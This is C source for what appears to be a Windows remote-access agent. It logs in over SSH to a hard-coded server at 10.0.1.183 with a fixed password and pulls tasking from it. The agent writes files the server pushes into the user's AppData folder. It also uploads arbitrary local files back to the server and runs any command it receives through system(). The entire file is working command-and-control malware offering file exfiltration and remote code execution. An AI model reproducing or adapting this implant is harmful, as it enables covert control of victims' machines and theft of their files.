#include "Header.h"

struct tasking_struct* firstStruct = NULL;
struct tasking_struct* lastStruct = NULL;
char folderpath[256] = "C:\\Users\\";
FILE* logfile;
ssh_session session = NULL;

int catchChannelError(int check, ssh_channel chan, const char* message) {
	if (check < 0) {
		fprintf(logfile, "CHANNEL ERROR ABORTING! Error: %s\n", message);
		ssh_channel_close(chan);
		ssh_channel_free(chan);
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		fclose(logfile);
		exit(check);
	}
	return check;
}

void sendOk(ssh_channel chan) {
	catchChannelError(ssh_channel_write(chan, "ok", 3), chan, "Failed to send OK");
}

int downloadFile(ssh_channel chan) {
	fprintf(logfile, "Received orders to download file %s\n", firstStruct->opts);
	
	char size[256];			//Needs to be fixed
	unsigned int sendsize;
	unsigned int contentssize;
	unsigned int filenamesize;
	unsigned int filecontentsize; 
	char* send;
	char* contents;
	char* filecontent;
	char* filename;
	FILE* file;

	sendsize = 4 + strlen(firstStruct->opts);
	send = malloc(sendsize);
	if (send != 0) {				//An absurd amount of safety to make the intellisense happy. I don't know, I suppose something really bad could happen but I seriously doubt it.
		_itoa_s(firstStruct->operation, send, sendsize, 10);
		strcat_s(send, sendsize, "|");
		strcat_s(send, sendsize, firstStruct->opts);
		catchChannelError(ssh_channel_write(chan, send, strlen(send) + 1), chan, "Failed to repeat command.");
		free(send);
	}
	else {
		free(send);
		return -1;
	}

	catchChannelError(ssh_channel_read(chan, size, sizeof(size), 0), chan, "Failed to receive file size.");
	sendOk(chan);

	size[255] = '\0';					//Some more safety
	contentssize = atoi(size) + 1;

	contents = malloc(contentssize);
	memset(contents, 0, contentssize);
	if (contents != 0) {						//Almost an absurd amount of safety (it makes the Visual Studio intellisense happy)
		int tempint = 0;
		while (tempint < contentssize - 1) {
			tempint += catchChannelError(ssh_channel_read(chan, contents + strlen(contents), contentssize - tempint, 0), chan, "Failed to receive contents.");
		}
		contents[contentssize - 1] = '\0';
		sendOk(chan);
	}
	else catchChannelError(-1, chan, "contents is 0.");

	fprintf(logfile, "contents: '%s'\n", contents);

	filecontentsize = b64_decoded_size(contents);
	filecontent = malloc(filecontentsize);
	if (filecontent != 0) {
		memset(filecontent, 0, filecontentsize);
		b64_decode(contents, filecontent, filecontentsize);
	}
	else catchChannelError(-1, chan, "filecontent is 0.");

	filenamesize = 2 + strlen(folderpath) + strlen(firstStruct->opts);
	filename = malloc(filenamesize);
	if (filename != 0) {
		strcpy_s(filename, filenamesize, folderpath);
		strcat_s(filename, filenamesize, "\\");
		strcat_s(filename, filenamesize, firstStruct->opts);
		fopen_s(&file, filename, "wb");
		free(filename);
		if (file == NULL)
		{
			catchChannelError(-1, chan, "Unable to create file.");
		}
		else {
			if (filecontent != 0) fwrite(filecontent, 1, filecontentsize, file);
			else catchChannelError(-1, chan, "filecontent became 0.");
			fclose(file);
		}
	}
	else {
		free(filename);
		catchChannelError(-1, chan, "filename is 0.");
	}
	free(contents);
	free(filecontent);
	return 0;
}

int readOK(ssh_channel chan) {
	char temp[3];
	catchChannelError(ssh_channel_read(chan, temp, 3, 0), chan, "Failed to read OK.");
	temp[2] = '\0';
	if (strcmp(temp, "ok") != 0) catchChannelError(-4, chan, "Failed to receive good OK.");
	return 0;
}

int uploadFile(ssh_channel chan) {
	fprintf(logfile, "Got tasking to upload file %s\n", firstStruct->opts);

	char* ufilename;
	FILE* toupload;
	char* sendcommand;
	char* filedata;
	char* uploadsizechar;		//change this for dynamic allocation
	int uploadsizemem = 0;

	ufilename = malloc(strlen(firstStruct->opts));
	int lastslash = 0;
	for (unsigned int i = 0; i < strlen(firstStruct->opts); ++i) {
		if (firstStruct->opts[i] == '\\') lastslash = i;
	}

	strncpy_s(ufilename, strlen(firstStruct->opts), firstStruct->opts + lastslash + 1, strlen(firstStruct->opts));

	fopen_s(&toupload, firstStruct->opts, "rb");
	if (toupload == NULL) catchChannelError(-3, chan, "Failed to open file.");
	if (toupload != 0) {
		unsigned int sendCommandSize = strlen(firstStruct->opts) + 4;
		sendcommand = malloc(sendCommandSize);
		if (sendcommand != 0) {
			strcpy_s(sendcommand, sendCommandSize, "11|");
			strcat_s(sendcommand, sendCommandSize, ufilename);
			
			fseek(toupload, 0L, SEEK_END);
			int uploadsize = ftell(toupload);
			int uploadsizee = b64_encoded_size(uploadsize);
			uploadsizemem = log10(uploadsizee) + 5;
			rewind(toupload);

			catchChannelError(ssh_channel_write(chan, sendcommand, sendCommandSize), chan, "Failed to repeat command.");
			readOK(chan);

			uploadsizechar = malloc(uploadsizemem);
			if (uploadsizechar != 0) {
				sprintf_s(uploadsizechar, uploadsizemem, "%d", uploadsizee);
				catchChannelError(ssh_channel_write(chan, uploadsizechar, uploadsizemem), chan, "Failed to send file size.");
			}
			else catchChannelError(-1, chan, "uploadsizechar was 0.");
			free(uploadsizechar);
			readOK(chan);
			
			filedata = 0;
			filedata = malloc(uploadsize);
			if (filedata != 0) {
				fread(filedata, 1, uploadsize + 1, toupload);
				char* encodedfiledata = b64_encode((unsigned char*)filedata, uploadsize + 1);
				catchChannelError(ssh_channel_write(chan, encodedfiledata, uploadsizee), chan, "Failed to send file content.");
				readOK(chan);
			}
			free(filedata);
		}
		else catchChannelError(-1, chan, "sendcommand was 0.");
		free(sendcommand);
	}
	else catchChannelError(-1, chan, "toupload was 0.");

	free(ufilename);
	free(toupload);
}

int parse_tasking(char* tasking, ssh_channel chan) {
	/* Parses and handles the tasking input from the server*/

	// checks if there is no tasking
	if (!strncmp(tasking, "default", 7)) {
		fprintf(logfile, "No tasks to do. Quitting...\n");
		catchChannelError(ssh_channel_write(chan, "0", 2), chan, "Failed to notify that there's no tasks.");
		return 0;
	}

	// get the number of instructions to complete
	int num = 0;
	char* tmp = tasking;
	char* dat = NULL;
	char tmpbf[3];

	for (; tasking[num]; tasking[num] == '\n' ? num++ : tasking++);
	tasking = tmp;
	fprintf(logfile, "Number of tasks to do: %d\n", num);
	//struct tasking_struct* tasking_arr[num];
	if (num == 0) return 0;

	char* nextToken = NULL;
	char* p = strtok_s(tasking, "\n", &nextToken);

	// Parses the data into list
	while (p != NULL)
	{
		// get operation int
		memset(tmpbf, 0, sizeof(tmpbf));
		strncat_s(tmpbf, _countof(tmpbf), p, 2);
		struct tasking_struct* curr = malloc(sizeof(struct tasking_struct));
		if (curr) {
			curr->operation = atoi(tmpbf);

			// get options for operation
			dat = _strdup(p + 3);
			curr->opts = dat;

			if (firstStruct == NULL) {
				firstStruct = curr;
				lastStruct = curr;
			}
			else {
				lastStruct->nextStruct = curr;
				lastStruct = curr;
			}
		}
		else return -1;

		// clean up and move on
		p = strtok_s(NULL, "\n", &nextToken);
		//memset(tmpbf, 0, 2);
	}
	if (firstStruct == NULL) return 0;

	for (int j = 0; j < num; j++) {
		switch (firstStruct->operation)
		{
		case AGENT_DOWN_FILE:
			downloadFile(chan);
			break;
		case AGENT_UP_FILE:
			uploadFile(chan);
			break;
		case AGENT_EXEC_SC:
			system(firstStruct->opts);
			break;
		default:
			fprintf(logfile, "ERROR: Caught unknown tasking value: %d\n", firstStruct->operation);
			break;
		}
		struct tasking_struct* temp = firstStruct;
		firstStruct = firstStruct->nextStruct;
		free(temp);
	}
	return 0;
}

int func_loop(ssh_session session)	//probably replace
{
	/* Primary function loop */
	// Initialize vars
	ssh_channel channel;
	char tasking[2048];

	memset(tasking, 0, sizeof(tasking));
	channel = ssh_channel_new(session);

	fprintf(logfile, "[+] Created new SSH channel\n");
	if (channel == NULL) return SSH_ERROR;

	// Open channel
	
	if (ssh_channel_open_session(channel) != SSH_OK)
	{
		ssh_channel_free(channel);
		return -1;
	}
	fprintf(logfile, "[+] Opened SSH Channel with remote server\n");
	// Request a shell interface

	catchChannelError(ssh_channel_request_shell(channel), channel, "Failed to request shell.");
	fprintf(logfile, "[+] Made it through check\n");
	
	// Send the global ID

	fprintf(logfile, "Identified as an agent\n");
	catchChannelError(ssh_channel_write(channel, "1", 2), channel, "Failed to send global ID.");

	//write that I am an agent
	char temp3[3];
	readOK(channel);
	catchChannelError(ssh_channel_write(channel, "NA\nNA\nNA\nNA\nNA", 15), channel, "Failed to send authentication information.");

	catchChannelError(ssh_channel_read(channel, tasking, sizeof(tasking), 0), channel, "Failed to read tasks.");

	fprintf(logfile, "Read data: %s\n", tasking);
	parse_tasking(tasking, channel);

	// close connections
	catchChannelError(ssh_channel_write(channel, "0", 2), channel, "Failed to send termination message.");

	int close = ssh_channel_close(channel);
	ssh_channel_free(channel);

	return close;
}

int catchError(int check, const char* message) {
	if (check != 0) fprintf(logfile, "%s Error: %i\n", message, check);
	return check;
}

ssh_session connectserver(const char* host, const char* user) {
	/*Connect to server*/
	ssh_session session;

	// initialize ssh session structure
	session = ssh_new();
	if (session == NULL) {
		fprintf(logfile, "Session is NULL\n");
		return NULL;
	}

	if (catchError(ssh_options_set(session, SSH_OPTIONS_USER, user), "Setting Username") != 0) return NULL;
	if (catchError(ssh_options_set(session, SSH_OPTIONS_HOST, host), "Setting Host") != 0) return NULL;
	if (catchError(ssh_connect(session), "Connection") != 0) return NULL;
	if (catchError(ssh_userauth_password(session, NULL, "lala"), "Authentication") != 0) return NULL;

	return session;
}

int main()
{
	char actualusername[UNLEN + 1];
	TCHAR username[UNLEN + 1];
	const DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	strncpy_s(actualusername, sizeof(actualusername), &(char)(username[0]), 1);
	for (unsigned int i = 1; i <= sizeof(username); i++) {
		if (isalpha(username[i]) | isdigit(username[i])) strncat_s(actualusername, _countof(actualusername), &(char)(username[i]), 1);
		else break;
	}
	strcat_s(folderpath, _countof(folderpath), actualusername);
	strcat_s(folderpath, _countof(folderpath), "\\AppData\\Roaming\\NICKTEST");
	int directorySuccess = _mkdir((const char*) folderpath);

	char logpath[256] = "";
	strcpy_s(logpath, _countof(logpath), folderpath);
	strcat_s(logpath, _countof(folderpath), "\\log.txt");
	fopen_s(&logfile, logpath, "a");
	
	if (logfile == 0) return -1;

	fprintf(logfile, "==============================\n\n");
	
	session = connectserver("10.0.1.183", "WINDOWS_CLIENT");	//Make this less hard-coded

	if (session == NULL) {
		fprintf(logfile, "Failed to create SSH session\n\n");
		ssh_disconnect(session);
		ssh_free(session);
		ssh_finalize();
		fclose(logfile);
		return 0;
	}

	func_loop(session);

	ssh_disconnect(session);
	ssh_free(session);
	ssh_finalize();
	fprintf(logfile, "Successfully disconnected from server\n\n");
	fclose(logfile);
	return 0;
}